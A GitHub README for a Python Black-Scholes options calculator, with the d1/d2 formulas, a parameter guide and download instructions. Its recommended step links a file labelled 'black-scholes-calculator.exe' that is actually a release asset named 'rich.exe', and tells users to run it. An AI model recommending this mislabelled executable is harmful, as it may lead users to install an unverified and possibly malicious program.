# Welcome to the Black-Scholes-Calculator

This project is a Python-based implementation of the famous Black-Scholes-Merton model, used to estimate the theoretical price of European-style options. 

This project was developed by exploring financial engineering concepts and refactoring the codebase in collaboration with AI to ensure clean, efficient, and robust execution.

## ⭐ Key Features
* **Robust Exception Handling:** Includes advanced edge-case handling, such as preventing **division-by-zero errors**
* **AI-Collaborative Refactoring:** Optimized code structure for high readability and performance.
* **Theoretical Grounding:** Implements the core financial engineering formula for Call and Put options.

## 🔬 Mathematical Background
This calculator dynamically computes options pricing using the classic Black-Scholes formula:

$$ d_1 = \frac{\ln(S/K) + \left(r + \frac{\sigma^2}{2}\right)t}{\sigma\sqrt{t}} $$

$$ d_2 = d_1 - \sigma\sqrt{t} $$

### 📝 Parameter Guide:
* $S$ : Current stock price (현재 주가)
* $K$ : Strike price of the option (행사 가격)
* $r$ : Risk-free interest rate (무위험 이자율)
* $\sigma$ : Volatility of the stock (주가 변동성)
* $t$ : Time to expiration in years (만기까지 남은 시간)

## 🛠️ Built With
* Python 3.14 (64-bit)
* Math & SciPy libraries (for precise cumulative distribution function calculations)

## 📥 How to Download & Run

### 1. For General Users (Recommended!)
1. Click **[👉 Download black-scholes-calculator.exe 📥](https://github.com/loveisworld732-del/black-scholes-calculator/releases/latest/download/rich.exe)** to download the application directly.
2. click the downloaded `.exe` file to run it. No Python installation required!

### 2. For Developers (Source Code Execution)
1. **[👉 edit code 👈](https://github.dev/loveisworld732-del/black-scholes-calculator/blob/main/main.py)** Click here to edit the code!

---
🎈 *This project was built with passion by a 14-year-old developer from South Korea. If you want to support my coding journey, please leave a ⭐ Star! Thank you!*
